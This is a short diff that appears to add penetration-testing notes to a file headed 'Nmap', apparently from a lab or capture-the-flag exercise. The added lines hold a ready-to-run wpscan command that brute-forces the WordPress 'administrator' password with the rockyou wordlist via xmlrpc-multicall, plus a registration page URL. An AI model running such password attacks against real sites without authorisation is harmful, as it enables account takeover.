@@ -1,3 +1,11 @@
+wpscan --url http://192.168.104.112 \
+  -U administrator \
+  -P /usr/share/wordlists/rockyou.txt \
+  --password-attack xmlrpc-multicall
+
+http://192.168.104.112/wp-register.php
+
+
 # Nmap
 
 ```
